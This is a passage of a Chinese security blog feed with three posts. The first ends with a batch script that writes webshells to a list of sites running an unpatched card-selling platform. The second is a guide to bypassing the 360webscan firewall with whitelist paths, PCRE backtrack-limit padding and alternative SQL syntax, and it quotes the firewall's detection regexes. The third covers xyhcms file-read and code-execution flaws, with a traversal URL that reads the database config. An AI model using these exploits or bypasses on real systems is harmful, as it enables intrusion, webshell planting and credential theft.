class="gutter"><pre><span class="line">85</span></pre></td><td class="code"><pre><span class="line">        write_shell(url)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">86</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">87</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">88</span></pre></td><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">89</span></pre></td><td class="code"><pre><span class="line">    mainf(1)</span></pre></td></tr></table></figure><p>url写在另一个同目录文件url.list中</p><h2 id="注"><a href="#注" class="headerlink" title="注"></a>注</h2><p>有的漏洞已经修复</p>]]></content>
    
    <summary type="html">
    
      阿洋发卡平台未修复的漏洞
    
    </summary>
    
    
      <category term="代码审计" scheme="http://h3art3ars.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://h3art3ars.github.io/tags/cms/"/>
    
      <category term="实战" scheme="http://h3art3ars.github.io/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>360webscan bypass</title>
    <link href="http://h3art3ars.github.io/2020/02/17/360webscan-bypass/"/>
    <id>http://h3art3ars.github.io/2020/02/17/360webscan-bypass/</id>
    <published>2020-02-17T05:39:48.000Z</published>
    <updated>2020-02-17T05:46:53.491Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>将360safe文件夹放入网站根目录，在入口文件或者需要过滤的文件使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if(is_file($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;360safe&#x2F;360webscan.php&#39;))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">require_once($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;360safe&#x2F;360webscan.php&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">if(is_file($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;360safe&#x2F;360webscan.php&#39;))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">require_once($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;360safe&#x2F;360webscan.php&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;select *  from tab where id &#x3D;&quot;.$_POST[&#39;id&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">echo $sql;</span></pre></td></tr></table></figure><h2 id="php-self白名单绕过"><a href="#php-self白名单绕过" class="headerlink" title="php_self白名单绕过"></a>php_self白名单绕过</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$webscan_white_directory&#x3D;&#39;admin|\&#x2F;dede\&#x2F;|\&#x2F;install\&#x2F;&#39;;</span></pre></td></tr></table></figure><p><code>php_self</code>中含有 <code>admin</code>或者 <code>/dede/</code> 或者 <code>/install/</code>时，不过滤字符</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>传参 <code>id=select * from aaa</code>拦截</p><p><img src="/images/360webscan1.png" alt=""></p><p>在urlpath之后添加 <code>/admin</code> ,<code>/dede/</code> ,<code>/install/</code>之后不拦截</p><p><img src="/images/360webscan2.png" alt=""></p><h2 id="white-url白名单绕过"><a href="#white-url白名单绕过" class="headerlink" title="white_url白名单绕过"></a>white_url白名单绕过</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$webscan_white_url &#x3D; array(&#39;index.php&#39; &#x3D;&gt; &#39;m&#x3D;admin&#39;,&#39;post.php&#39; &#x3D;&gt; &#39;job&#x3D;postnew&amp;step&#x3D;post&#39;,&#39;edit_space_info.php&#39;&#x3D;&gt;&#39;&#39;);</span></pre></td></tr></table></figure><p><code>index.php?m=admin</code>, <code>post.php?job=postnew&amp;step=post</code>  , <code>edit_apace_info.php</code>不过滤</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><img src="/images/360webscan3.png" alt=""></p><p><img src="/images/360webscan5.png" alt=""></p><p><img src="/images/360webscan6.png" alt=""></p><p>这两个白名单的方法很容易会被使用的人给更改掉</p><h2 id="超长字符串绕过正则"><a href="#超长字符串绕过正则" class="headerlink" title="超长字符串绕过正则"></a>超长字符串绕过正则</h2><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;get拦截规则</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$getfilter &#x3D; &quot;\\b(alert\\(|confirm\\(|prompt\\()\\b|&lt;[^&gt;]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b[^&gt;]*?&gt;|^\\+\\&#x2F;v(8|9)|\\b(and|or)\\b([&#39;\&quot;\\d]+?&#x3D;[&#39;\&quot;\\d]+?|[&#39;\&quot;a-zA-Z]+?&#x3D;[&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\&#x2F;\\*.+?\\*\\&#x2F;|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;post拦截规则</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$postfilter &#x3D; &quot;\\b(alert\\(|confirm\\(|prompt\\()\\b|&lt;[^&gt;]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b[^&gt;]*?&gt;|\\b(and|or)\\b([&#39;\&quot;\\d]+?&#x3D;[&#39;\&quot;\\d]+?|[&#39;\&quot;a-zA-Z]+?&#x3D;[&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\&#x2F;\\*.+?\\*\\&#x2F;|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;cookie拦截规则</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">$cookiefilter &#x3D; &quot;\\b(and|or)\\b([&#39;\&quot;\\d]+?&#x3D;[&#39;\&quot;\\d]+?|[&#39;\&quot;a-zA-Z]+?&#x3D;[&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\&#x2F;\\*.+?\\*\\&#x2F;|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;</span></pre></td></tr></table></figure><p>是正则表达式设置规则，因此可利用<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">import requests</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">def exp():</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    domain &#x3D; &#39;http:&#x2F;&#x2F;debug.com&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    path &#x3D; &#39;&#x2F;test.php&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    url &#x3D; domain + path</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    headers &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;51.0.2704.103 Safari&#x2F;537.36&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    # payload &#x3D; &quot;select *&#x2F;*&quot;+&#39;a&#39;*1000000+&#39;*&#x2F; from aaa&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    payload &#x3D; &quot;select * from aaa&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    data &#x3D; &#123;&quot;id&quot;: payload&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    url &#x3D; domain+path</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    res &#x3D; requests.post(url&#x3D;url, data&#x3D;data, headers&#x3D;headers)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    if &#39;webscan&#39;in res.text:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">        print(&quot;fobidden!\n&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">        exit()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">    print(res.text)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    exp()</span></pre></td></tr></table></figure><p>当直接传参时候,显示拦截了</p><p><img src="/images/360webscan7.png" alt=""></p><p>当填充<code>payload</code>即<code>id</code>参数中1000000个a时</p><p><img src="/images/360webscan8.png" alt=""></p><h2 id="插入绕过正则"><a href="#插入绕过正则" class="headerlink" title="插入绕过正则"></a>插入绕过正则</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">INSERT\\s+INTO.+?VALUES</span></pre></td></tr></table></figure><p>insert 数据可以用另几种方式</p><ol><li><code>insert into table set name = &#39;admin&#39;,pass = &#39;123456&#39;</code></li><li><code>insert table(name,password) values(&#39;admin&#39;,&#39;123456&#39;)</code></li><li><code>insert into table(name,password) select &#39;admin&#39;,&#39;123456&#39;</code></li></ol><p>这几种写法可以随意组合着用</p><p>可用性测试：</p><p><img src="/images/360webscan12.png" alt=""></p><p>绕过测试</p><p><img src="/images/360webscan9.png" alt=""></p><p><img src="/images/360webscan10.png" alt=""></p><p><img src="/images/360webscan11.png" alt=""></p><p>另外，还可以用 <code>replace into</code>来代替<code>insert</code>与<code>update</code>，而且<code>replace into</code>也有和<code>insert into</code>一样的三种写法加上一种普通写法都可以绕过。</p><h2 id="老版本绕过"><a href="#老版本绕过" class="headerlink" title="老版本绕过"></a>老版本绕过</h2><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p> WEBSCAN_VERSION：0.1.3.2 </p><p>先在使用了360通防的页面上发送<code>?id=union select ’1,2,3&#39;</code>若是拦截，再发送<code>id = union select!1,2,3</code>不拦截，则可以union绕过。</p><p>可使用</p><ol><li><code>union select!1,user(),3</code></li><li><code>union select@1,user(),3</code></li></ol><p>若是数据库编码不是utf-8则可以使用%a0隔绝select与from造成绕过。（编码问题不懂）</p><p><code>select%a0*%a0from%20tables</code></p>]]></content>
    
    <summary type="html">
    
      绕过360webscan通防的方法
    
    </summary>
    
    
      <category term="waf" scheme="http://h3art3ars.github.io/categories/waf/"/>
    
    
      <category term="waf" scheme="http://h3art3ars.github.io/tags/waf/"/>
    
      <category term="bypass" scheme="http://h3art3ars.github.io/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>xyhcms漏洞整理</title>
    <link href="http://h3art3ars.github.io/2020/01/27/xyhcms%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/"/>
    <id>http://h3art3ars.github.io/2020/01/27/xyhcms%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</id>
    <published>2020-01-27T07:35:37.000Z</published>
    <updated>2020-01-27T07:44:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="涉及版本"><a href="#涉及版本" class="headerlink" title="涉及版本"></a>涉及版本</h2><ul><li>v3.5</li><li>v3.6</li><li>v2</li></ul><h3 id="任意文件读取（后台）"><a href="#任意文件读取（后台）" class="headerlink" title="任意文件读取（后台）"></a>任意文件读取（后台）</h3><ul><li><h4 id="漏洞文件位置"><a href="#漏洞文件位置" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p>/App/Manage/Controller/TempletsController.class.php 第59-83行：</p></li><li><h4 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>没有对传入的fname参数进行过滤</p></li><li><h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function edit() &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$ftype &#x3D; I(&#39;ftype&#39;, 0, &#39;intval&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$fname &#x3D; I(&#39;fname&#39;, &#39;&#39;, &#39;trim,htmlspecialchars&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$file_path &#x3D; !$ftype ? &#39;.&#x2F;Public&#x2F;Home&#x2F;&#39; . C(&#39;CFG_THEMESTYLE&#39;) . &#39;&#x2F;&#39; : &#39;.&#x2F;Public&#x2F;Mobile&#x2F;&#39; . C(&#39;CFG_MOBILE_THEMESTYLE&#39;) . &#39;&#x2F;&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">if (IS_POST) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">if (empty($fname)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;未指定文件名&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">$_ext &#x3D; &#39;.&#39; . pathinfo($fname, PATHINFO_EXTENSION);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">$_cfg_ext &#x3D; C(&#39;TMPL_TEMPLATE_SUFFIX&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">if ($_ext !&#x3D; $_cfg_ext) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;文件后缀必须为&quot;&#39; . $_cfg_ext . &#39;&quot;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">$content &#x3D; I(&#39;content&#39;, &#39;&#39;, &#39;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">$fname &#x3D; ltrim($fname, &#39;.&#x2F;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">$truefile &#x3D; $file_path . $fname;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">if (false !&#x3D;&#x3D; strpos($fname, &#39;&#x2F;&#39;) || false !&#x3D;&#x3D; strpos($fname, &#39;\\&#39;)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;文件名不允许包含非法字符，如\&#x2F;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;.*?&lt;\&#x2F;script&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">$preg_param &#x3D; &#39;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;&#x2F;is&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">if (stripos($content, &#39;&lt;?php&#39;) !&#x3D;&#x3D; false || preg_match($preg_param, $content)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;模板内容禁止包含php代码！&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">if (false !&#x3D;&#x3D; file_put_contents($truefile, $content)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">$this-&gt;success(&#39;保存成功&#39;, U(&#39;index&#39;, array(&#39;ftype&#39; &#x3D;&gt; $ftype)));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">&#125; else &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;保存文件失败，请重试&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">exit();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">$fname &#x3D; base64_decode($fname);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">var_dump($fname);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;exit();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">if (empty($fname)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;未指定要编辑的文件&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">$truefile &#x3D; $file_path . $fname;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">if (!file_exists($truefile)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;文件不存在&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">$content &#x3D; file_get_contents($truefile);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">if ($content &#x3D;&#x3D;&#x3D; false) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;读取文件失败&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">$content &#x3D; htmlspecialchars($content);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">$this-&gt;assign(&#39;ftype&#39;, $ftype);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">$this-&gt;assign(&#39;fname&#39;, $fname);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">$this-&gt;assign(&#39;content&#39;, $content);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">$this-&gt;assign(&#39;type&#39;, &#39;修改模板&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">$this-&gt;display();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li></ul><ul><li><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>数据库配置文件路径：<code>\App\Common\Conf\db.php</code> </li><li>组成相对路径 <code>..\\..\\..\\App\\Common\\Conf\\db.php</code></li><li>base64编码，<code>Li5cXC4uXFwuLlxcQXBwXFxDb21tb25cXENvbmZcXGRiLnBocA==</code> </li><li>最后构造的链接形式如下：<code>http://127.0.0.1/xyhai.php?s=/Templets/edit/fname/Li5cXC4uXFwuLlxcQXBwXFxDb21tb25cXENvbmZcXGRiLnBocA==</code> </li></ol></li><li><h4 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h4><p>下载v3.5，发现代码已经做了过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if (false !&#x3D;&#x3D; strpos($fname, &#39;&#x2F;&#39;) || false !&#x3D;&#x3D; strpos($fname, &#39;\\&#39;)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;文件名不允许包含非法字符，如\&#x2F;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li></ul><h3 id="文件写入导致代码执行漏洞（后台）"><a href="#文件写入导致代码执行漏洞（后台）" class="headerlink" title="文件写入导致代码执行漏洞（后台）"></a>文件写入导致代码执行漏洞（后台）</h3><ul><li><h4 id="漏洞文件位置-1"><a href="#漏洞文件位置-1" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/SystemController.class.php</code></p></li><li><h4 id="漏洞原因-1"><a href="#漏洞原因-1" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>对写入文件的内容过滤不严</p></li><li><h4 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function site() &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">if (IS_POST) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$data &#x3D; I(&#39;config&#39;, array(), &#39;trim&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;.*?&lt;\&#x2F;script&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">$preg_param &#x3D; &#39;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;&#x2F;is&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">foreach ($data as $key &#x3D;&gt; $val) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">if (stripos($val, &#39;&lt;?php&#39;) !&#x3D;&#x3D; false) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">$data[$key] &#x3D; preg_replace(&#39;&#x2F;&lt;\?php(.+?)\?&gt;&#x2F;i&#39;, &#39;&#39;, $val);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">————————————————————————————————————————————————————————————————————————————</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">if (stripos($val, &#39;&lt;script&#39;) !&#x3D;&#x3D; false &amp;&amp; stripos($val, &#39;php&#39;) !&#x3D;&#x3D; false) &#123;</span></pre></td></tr><tr><td 